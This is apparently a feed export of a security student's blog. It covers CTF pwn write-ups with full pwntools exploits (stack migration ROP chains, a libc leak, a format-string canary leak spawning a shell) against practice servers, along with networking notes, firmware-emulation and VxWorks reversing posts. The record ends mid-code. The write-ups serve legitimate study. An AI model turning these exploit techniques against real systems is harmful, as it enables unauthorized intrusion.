    <content type="html"><![CDATA[<h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h3><h4 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h4><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p><p><img src="/img/stack_migration/1.jpg"></p><p>溢出的长度不足以写rop链，劫持rbp到一个足够大的空间里去</p><p>首先通过调试查看ebp到可输入空间开头的距离</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb.attach(p, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <span class="hljs-comment"># 在python pwntools里下断点的方法（要放在开头），进去按一下c</span><br></code></pre></td></tr></table></figure><p><img src="/img/stack_migration/2.jpg"></p><p>程序输出的rbp为<code>0xffdb7098</code>，和图中aaaa的位置相差0x38，一会就要将ebp覆盖为ebp-0x38，从而开辟足够的空间来构造rop</p><p>然后<code>vul()</code>函数原本的返回地址被<code>&amp;(leave ret)</code>取代了这样在<code>vul()</code>执行结束时，相当于多执行一次leave ret</p><p>过程如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>. vul()原本的<span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x38</span>   <span class="hljs-built_in">ebp</span>-&gt;aaaa   <span class="hljs-built_in">esp</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span><br><span class="hljs-number">2</span>. vul()原本的<span class="hljs-keyword">ret</span><br><span class="hljs-built_in">eip</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span>  <span class="hljs-built_in">esp</span>-&gt;比返回地址再低<span class="hljs-number">4</span>个字节的位置上<br><span class="hljs-number">3</span>. <span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;aaaa    <span class="hljs-built_in">ebp</span> == aaaa  <span class="hljs-built_in">esp</span>-&gt;system@plt<br><span class="hljs-number">4</span>. <span class="hljs-keyword">ret</span> <br><span class="hljs-built_in">eip</span>-&gt;system@plt   <span class="hljs-built_in">esp</span>-&gt;system的返回地址（瞎写的）<br></code></pre></td></tr></table></figure><p>这时，就相当于一个普通的rop了，system@plt为一个被溢出的返回地址，在他后面的是system的返回地址和它的参数，而”/bin/sh\x00”为一个字符串，需要一个指针指向它，因此需要计算一下binsh的地址。</p><p>由于aaaa是ebp-0x38，binsh距离aaaa有16个字节，那么这个地方填上ebp-0x28，就能给system传进去binsh的参数了。</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./ciscn_2019_es_2&quot;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25391)</span><br>gdb.attach(r, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>main=<span class="hljs-number">0xdeadbeef</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>ebp = u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(ebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br><br>r.send(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="NewStarCTF-2023"><a href="#NewStarCTF-2023" class="headerlink" title="NewStarCTF 2023"></a>NewStarCTF 2<strong>023</strong></h4><p>stack migration</p><p><img src="/img/stack_migration/3.jpg"></p><p>和前面的唯一区别在于需要先泄露libc地址，题目又给了libc</p><p>需要注意的还是不要sendline，因为会多一个\n，占掉了下一次输入，payload2就输入不进去了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25029</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x4012a9&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br><br>leave_ret = <span class="hljs-number">0x4012aa</span><br>poprdi_ret = <span class="hljs-number">0x401333</span><br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-comment">#main = e.sym[&quot;main&quot;]</span><br>main = <span class="hljs-number">0x4012ac</span><br>start = <span class="hljs-number">0x4010b0</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = ( p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.send(payload2)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts:----&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>libc.address =  puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = (p64(poprdi_ret) + p64(binsh) + p64(system)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>canary</title>
    <link href="/2023/10/11/ctf-pwn/canary/"/>
    <url>/2023/10/11/ctf-pwn/canary/</url>
    
    <content type="html"><![CDATA[<h3 id="canary泄露"><a href="#canary泄露" class="headerlink" title="canary泄露"></a>canary泄露</h3><p>NewStarCTF 2023 canary：</p><p><img src="/img/canary/1.jpg"></p><p><code>__readfsqword(0x28u)</code>说明添加了canary，但是第一次输入只能输入32字节，距离把canary一块printf出来差了8字节，因此用格式化字符串漏洞把canary打印出来。</p><p><code>printf</code>的参数中，rdi为第一次输入的格式化字符串，然后需要5个%p把rsi，rdx，rcx，r8，r9略过，然后再来6个%p（因为后面的参数在栈上，而canary是栈上第41-48字节，需要第六个%p才能将其打印出来）</p><p>然后第二次输入就是一个最简单的rop链了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./canary&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28964</span>)<br>e = ELF(<span class="hljs-string">&quot;./canary&quot;</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>backdoor = e.sym[<span class="hljs-string">&quot;backdoor&quot;</span>]<br><br>payload = <span class="hljs-string">b&quot;%p%p%p%p%p%p%p%p%p%p%p&quot;</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Give me some gift?\n&quot;</span>, payload)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Oh thanks,There is my gift:\n&quot;</span>)<br><br>leak = p.recvline()<br><br>canary = <span class="hljs-built_in">eval</span>(leak[-<span class="hljs-number">19</span>:-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Show me your magic\n&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>word隐写</title>
    <link href="/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/"/>
    <url>/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h3><p>.docx文件改后缀为.zip</p><p>里面全是xml文件，如下图</p><p>用vscode打开xml时可以用<code>shift alt f</code>进行格式整理（需要装一个xml formatter）</p><p><img src="/img/steganography/1.jpg"></p><p>例如上图中的题目是在document.xml里放了一段密文</p><p>ppt同理</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络知识补习</title>
    <link href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="Ethernet-II-帧"><a href="#Ethernet-II-帧" class="headerlink" title="Ethernet_II 帧"></a>Ethernet_II 帧</h3><p>14个字节</p><blockquote><p>dst MAC + src Mac + Type    =    6 + 6 + 2   =  14Bytes</p></blockquote><p>在数据链路层还会在报文结尾添加FCS（帧校验序列），<strong>但是Wireshark里并不会把他显示出来</strong></p><h3 id="ARP和RARP协议"><a href="#ARP和RARP协议" class="headerlink" title="ARP和RARP协议"></a>ARP和RARP协议</h3><p>（Reverse) Address Resolution Protocal </p><p>将32位网络层地址转为链路层48位MAC地址，逆地址解析协议相反。</p><p>关于属于哪一层协议比较模糊，目前比较多的人认为:</p><blockquote><p>在tcp/ip里属于网络层，在OSI里属于链路层（存疑）</p></blockquote><p><strong>报文格式：</strong></p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/arp.jpg"></p><p>由<code>Ethernet_II</code>和<code>ARP</code>两部分构成（所以从这里来看还是当成网络层比较好）</p><p>ARP部分共28字节</p><p>包括8字节的报头（硬件类型，上层协议类型，MAC地址长度，IP地址长度，操作类型）</p><p>剩下20字节为：源mac，源IP，目的mac（00填充），目的IP</p><p>某个主机收到一个arp广播之后，查看报文里的IP是不是自己的IP，如果不是就只将对方IP/MAC记录到arp表里</p><blockquote><p>arp -a # 查看arp表</p></blockquote><p>如果是自己的IP，返回</p><blockquote><p>ARP协议在IPV6中不再使用，取代其的是NDP</p></blockquote><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>Internet Control Message Protocol，”主要用来检测网络通信故障和实现链路追踪“</p><p>虽然从报文格式来看，ICMP报文在IP报头之后，但<strong>ICMP属于网络层协议</strong>，常见的用途包括PING和traceRoute</p><p>例如PING：</p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ICMP.jpg"></p><p> 包括8字节的报头，以及后面的报文，PING的报文为32个小写的英文字母（请求和响应都是这个结构）</p><h3 id="内网IP"><a href="#内网IP" class="headerlink" title="内网IP"></a>内网IP</h3><p>因特网分配编号委员会（IANA）保留了3块IP地址做为私有IP地址：</p><p>10.0.0.0 ——— 10.255.255.255</p><p>172.16.0.0——— 172.16.255.255</p><p>192.168.0.0———192.168.255.255</p><h3 id="NAT机制"><a href="#NAT机制" class="headerlink" title="NAT机制"></a>NAT机制</h3><p>Network Address Translation</p><p><strong>静态NAT</strong>：内网IP与公网IP一一对应，静态NAT不能减少公网IP地址的使用</p><p><strong>动态NAT</strong>：将公有地址池以先到先得的方式分配（公网IP少于内网IP）</p><p>**端口地址转换（NAPT/PAT)**：路由器通过报文的IP是0~65535的哪个，决定将报文发送给内网哪台主机</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS解析：UDP协议，端口53</p><p>解析顺序：浏览器缓存，本地Hosts文件，路由器缓存，然后才是DNS服务器解析（循环解析，递归解析）</p><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>Dynamic Host Configuration Protocol，UDP协议</p><p>简单来说，DHCP就是一个不需要账号密码登录的、自动给内网机器分配IP地址等信息的协议。</p><p>在DHCP报文开始会有一个op字段，包括：</p><p>请求报文：DHCP Discover、DHCP Request、DHCP Release、DHCP Inform和DHCP Decline。<br>应答报文：DHCP Offer、DHCP ACK和DHCP NAK。</p><p>首先客户端广播（Discover），然后服务器应答（Offer)，客户端选择最先收到的offer进行广播（Request），服务器对其进行IP地址分配（DHCP ACK）</p><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><blockquote><p>为什么要用子网掩码？</p></blockquote><p>分离网络地址和主机地址，两台主机通信时，对子网掩码进行与操作得到网络地址</p><p>网络地址相同，就用ARP协议发现mac地址，如果不同就发送到网关（路由器的IP地址）</p><p>192.168.1.1/30 斜杠后面的就是子网掩码，表示有几个1，例如24就是255.255.255.0</p><blockquote><p>IPv4数据包的选项部分</p></blockquote><p>变长、可选。有一个一字节的选项码。例如</p><p>严格源路由，选项后面会跟着一个列表，数据包必须严格经过上面所有路由器</p><p>宽松源路由，只给出关键点，剩下的由自动路由选择功能补充</p><blockquote><p>广播</p></blockquote><p>受限广播：ip.dst==255.255.255.255，只能本地广播，路由不会转发。（Ether帧的dst是ff:ff:ff:ff:ff:ff）</p><p>直接广播：ip.dst的主机地址全设置为1，网络地址同ip.src（Ether的dst还是6个ff），例如：</p><p>192.168.1.1/30可以发送广播包(192.168.1.7)，使主机192.168.1.5/30 也可以接收到该数据包，前提是之间的路由器要开启定向广播功能。</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><blockquote><p>ping of death</p></blockquote><p>数据包分片之后重组，重组之后缓冲区溢出</p><blockquote><p>ICMP Smurf 反射放大攻击</p></blockquote><p>伪造ip.src，大量机器向被攻击主机返回icmp echo</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>英语课笔记</title>
    <link href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/"/>
    <url>/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/</url>
    
    <content type="html"><![CDATA[<p>listening and speaking resources</p><ol><li><p><a href="http://www.ted.com/">www.ted.com</a></p></li><li><p><a href="http://www.bbc.co.uk/learningenglish">www.bbc.co.uk/learningenglish</a></p></li><li><p><a href="http://www.elllo.org/">www.elllo.org</a></p></li></ol><p>academic reading and writing resources</p><ol><li>&lt;<a href="http://www.idebate.org&gt;/">www.idebate.org&gt;</a></li><li><a href="http://www.nottingham.ac.uk/">www.nottingham.ac.uk</a></li><li>academic phrasebank <a href="http://www.phrasebank.manchester.ac.uk/">www.phrasebank.manchester.ac.uk</a></li></ol><p>vocablulary learning tools</p><ol><li><a href="http://www.dictionary.com/">www.dictionary.com</a></li><li><a href="http://www.linguee.com/">www.linguee.com</a></li><li><a href="http://www.wantwords.net/">www.wantwords.net</a></li></ol><p>corpus</p><ol><li>corpus of contemporary American English</li><li></li></ol>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>英语</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>firmae安装及D-Link DSL-3782仿真</title>
    <link href="/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/"/>
    <url>/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/</url>
    
    <content type="html"><![CDATA[<h3 id="FirmAE安装"><a href="#FirmAE安装" class="headerlink" title="FirmAE安装"></a>FirmAE安装</h3><p><code>https://github.com/pr0v3rbs/FirmAExu</code></p><p>需要注意的点：</p><ol><li>git clone时记得recursive，不能git clone就把 routersploit这个库复制到<code>./analysis</code>里</li><li><code>download.sh</code>里的下载最好自己下来复制到<code>./binaries</code>里</li><li><code>install.sh</code>中 open-jdk-8和fusecram没法直接从apt安装（暂时当它不存在）</li></ol><h3 id="DLink-DSL-3782漏洞复现"><a href="#DLink-DSL-3782漏洞复现" class="headerlink" title="DLink DSL-3782漏洞复现"></a>DLink DSL-3782漏洞复现</h3><p>固件地址：<a href="https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip">https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip</a></p><p>参考方法：<a href="https://bbs.kanxue.com/thread-278413.htm">https://bbs.kanxue.com/thread-278413.htm</a></p><p>先直接把固件跑起来，抄一下exp试一试：</p><p><img src="/img/CVE-2023-27216/1.jpg"></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h4>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VxWorks固件函数符号恢复、固件加载地址识别</title>
    <link href="/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/"/>
    <url>/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/</url>
    
    <content type="html"><![CDATA[<h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p><img src="/img/VxWorks/1.jpg"></p><p>参考文章 <a href="https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html">CTFHUB-WriteUp</a></p><p>binwalk提取出名为385的固件，确定是VxWorks内核，并且带有符号表</p><p><img src="/img/VxWorks/2.jpg"></p><p>然后用binwalk -A 确定架构和大小端</p><p><img src="/img/VxWorks/3.jpg"></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>从binwalk结果可以看出符号表在<code>0x301E74</code>附近（这不一定是真实值）</p><p><img src="/img/VxWorks/4.jpg"></p><p>VxWorks符号表每一项由4部分组成，0-3字节是4个<code>00</code>，4-7字节是符号字符串所在内存地址，8-11是符号对应的内容所在地址，12-15字节表示这是一个什么类型的符号。</p><p>如上图，这是一个符号地址在<code>0x27655C</code>，内容在<code>0x1FF058</code>，类型为函数（0x500）的一个符号</p><p>函数名字</p><p>writeup里说可以在这两个地址上直接看到对应的内容，但我的ida里这两个地址上的东西显然不对。。。暂留问题</p><p>（并且ida直接加载我这里一个函数都没有，不知道和writeup使用的差别在哪…）</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>固件逆向</title>
    <link href="/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/"/>
    <url>/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/</url>
    
    <content type="html"><![CDATA[<h4 id="题目1-buuctf-firmware"><a href="#题目1-buuctf-firmware" class="headerlink" title="题目1-buuctf-firmware"></a>题目1-buuctf-firmware</h4><p><a href="https://buuoj.cn/challenges#firmware">https://buuoj.cn/challenges#firmware</a></p><p><img src="/img/firmware/1.jpg"></p><p>使用binwalk提取固件</p><p><img src="/img/firmware/2.jpg"></p><p>可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序</p><p><img src="/img/firmware/3.jpg"></p><p>用upx脱壳后寻找类似网址的字符串，找到以下三个</p><p><img src="/img/firmware/4.jpg"></p><p>首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个</p><p><img src="/img/firmware/5.jpg"></p><p>第二个、第三个只出现在send函数发送的字符串里，显然不对</p><p><img src="/img/firmware/6.jpg"></p><p><img src="/img/firmware/7.jpg"></p><p>因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}</p><h4 id="题目2-CTFHUB-二次设备固件逆向"><a href="#题目2-CTFHUB-二次设备固件逆向" class="headerlink" title="题目2-CTFHUB-二次设备固件逆向"></a>题目2-CTFHUB-二次设备固件逆向</h4><p>直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串</p><p><img src="/img/firmware/8.jpg"></p><p>打开JZPHMISystem，搜索password字符串</p><p><img src="/img/firmware/9.jpg"></p><p>按x找引用到这里，发现了一个叫做inputPassword的函数</p><p><img src="/img/firmware/10.jpg"></p><p>这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数</p><p><img src="/img/firmware/11.jpg"></p><p>双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码</p><p>然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程</p><p>只不过在rootPasswd这里存在区别</p><p><img src="/img/firmware/12.jpg"></p><p>把这个icspwd提交上去就是对的。。。前面那个689078就不行</p><h4 id="题目3-CTFHUB-简单的固件逆向分析"><a href="#题目3-CTFHUB-简单的固件逆向分析" class="headerlink" title="题目3-CTFHUB-简单的固件逆向分析"></a>题目3-CTFHUB-简单的固件逆向分析</h4><p>用tree查看文件结构之后发现有用的二进制文件只有一个<code>wwwroot/conf/exec/NOE7701.bin</code></p><p>使用binwalk提取出来217和217.zlib两个文件</p><p>用binwalk -A查看217的架构，发现是PowerPC big-endian</p><p><img src="/img/firmware/13.jpg"></p><p>接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 <a href="https://www.cnblogs.com/yangmzh3/p/11231423.html">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p><p><img src="/img/firmware/13_.jpg"></p><p>用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址</p><p><img src="/img/firmware/14.jpg"></p><p><img src="/img/firmware/15.jpg"></p><p>发现ida识别不出来函数，由于固件里编入了符号表，可以手动恢复函数名</p><p>从网上找了这个idc脚本，用于恢复VxWorks符号表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 